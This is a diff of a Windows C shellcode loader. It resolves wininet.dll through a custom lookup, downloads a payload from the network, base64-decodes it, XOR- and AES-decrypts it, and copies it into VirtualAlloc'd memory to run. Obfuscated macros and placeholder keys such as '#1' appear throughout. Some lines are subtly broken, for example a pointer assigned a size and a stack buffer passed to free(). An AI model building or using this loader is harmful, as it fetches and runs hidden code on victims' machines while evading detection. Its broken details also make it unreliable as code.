@@ -1,12 +1,19 @@
+#include <Windows.h>
 #include <stdio.h>
-#include <windows.h>
 #include <wininet.h>
+#include <bcrypt.h>
+#include <Wincrypt.h>
 
+#include "aes.h"
 #include "Structs.h"
 #include "GetterFunctions.h"
-#include "Encrypters.h"
 
 #pragma comment(lib, "wininet.lib")
+#pragma comment(lib, "bcrypt.lib")
+#pragma comment(lib, "Crypt32.lib")
+
+#define NT_SUCCESS(Status)          (((NTSTATUS)(Status)) >= 0)
+#define STATUS_UNSUCCESSFUL         ((NTSTATUS)0xC0000001L)
 
 //#include "Structs.h"
 
@@ -21,6 +28,32 @@
 #define t size_t
 n* memMirror(n* aA, const n* bB, t cC) { l m x s(l m)aA, m y s(l m)bB; o(cC q)* x r s* y r; p aA; }
 
+BOOL Base64Decode(PCHAR base64, DWORD base64Size, PBYTE* pDecoded, DWORD* pDecodedSize) {
+    if (!CryptStringToBinaryA(base64, base64Size, CRYPT_STRING_BASE64, NULL, pDecodedSize, NULL, NULL)) {
+        printf("First base64 decode: Error %u in CryptStringToBinaryA.", GetLastError());
+        return FALSE;
+    }
+
+    *pDecoded = (PBYTE)malloc(*pDecodedSize);
+    if (*pDecoded == NULL) {
+        printf("Memory allocation failed.");
+        return FALSE;
+    }
+
+    if (!CryptStringToBinaryA(base64, base64Size, CRYPT_STRING_BASE64, *pDecoded, pDecodedSize, NULL, NULL)) {
+        printf("Second base64 decode: Error %u in CryptStringToBinaryA.", GetLastError());
+        free(*pDecoded);
+        return FALSE;
+    }
+
+    return TRUE;
+}
+
+void XOR(PBYTE data, DWORD dataSize, PBYTE key, DWORD keySize) {
+    for (DWORD i = 0; i < dataSize; ++i) {
+        data[i] ^= key[i % keySize];
+    }
+}
 
 typedef HINTERNET(WINAPI* INTERNETOPEN)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
 typedef HINTERNET(WINAPI* INTERNETOPENURL)(HINTERNET, LPCWSTR, LPCWSTR, DWORD, DWORD, DWORD_PTR);
@@ -30,7 +63,7 @@ typedef BOOL(WINAPI* LPInternetCloseHandle)(HINTERNET);
 int main() {
     // Get a handle to the DLL module
     HMODULE hDll = GetModuleHandleReplacement(TEXT("wininet.dll"));
-    char buffer[4096];
+    unsigned char buffer[4096];
     DWORD bytesRead;
     DWORD totalBytesRead = 0;
 
@@ -58,32 +91,34 @@ int main() {
         }
     }
 
-    unsigned char* enc_shellcode = (unsigned char*)buffer;
-    int enc_shellcode_size = totalBytesRead;
-
-    // Convert to char array
-    char* char_enc_shellcode = malloc(enc_shellcode_size + 1);
-    if (char_enc_shellcode == NULL) {
-        printf("Memory allocation failed.");
-        return FALSE;
-    }
-    for (int i = 0; i < enc_shellcode_size; i++) {
-        char_enc_shellcode[i] = (char)enc_shellcode[i];
-    }
-    char_enc_shellcode[enc_shellcode_size] = '\0'; // Null-terminate the char array
-
     // Now you can use `char_enc_shellcode` as a char array.
     unsigned char* shellcode = NULL;
-    DWORD shellcode_size = 0;
+    DWORD* shellcode_size = 0;
 
-    if (!DecryptPayload((PBYTE)char_enc_shellcode, enc_shellcode_size, &shellcode, &shellcode_size)) {
-        printf("Error in DecryptPayload.");
-        free(char_enc_shellcode);
-        return 1;
-    }
+    DWORD cbData = 0;
+    DWORD decryptedSize = 0;
+    unsigned char xorKey[] = "#1";
+    DWORD xorKeySize = strlen(xorKey);
+    unsigned char aesKey[] = "#2";
+    DWORD aesKeySize = strlen(aesKey);
+    unsigned char aesIV[] = "#3";
+    DWORD aesIVSize = strlen(aesIV);
 
+    PBYTE encryptedPayload;
+    DWORD encryptedSize;
 
-    void* execMem = VirtualAlloc(0, shellcode_size, MEM_COMMIT, PAGE_EXECUTE_WRITECOPY);
+    Base64Decode(buffer, totalBytesRead, &encryptedPayload, &encryptedSize);
+
+    XOR(encryptedPayload, encryptedSize, xorKey, xorKeySize);
+
+    struct AES_ctx ctx;
+    AES_init_ctx_iv(&ctx, aesKey, aesIV);
+    AES_CBC_decrypt_buffer(&ctx, encryptedPayload, encryptedSize);
+
+    shellcode = encryptedPayload;
+    shellcode_size = encryptedSize;
+
+    void* execMem = VirtualAlloc(0, shellcode_size, MEM_COMMIT, PAGE_READWRITE);
     if (execMem != NULL) {
         memMirror(execMem, shellcode, shellcode_size);
         DWORD oldProtect;
@@ -100,7 +135,7 @@ int main() {
         printf("Error in VirtualAlloc: %u\n", GetLastError());
     }
 
-    free(char_enc_shellcode);
+    free(buffer);
     free(shellcode);
     return 0;
 }
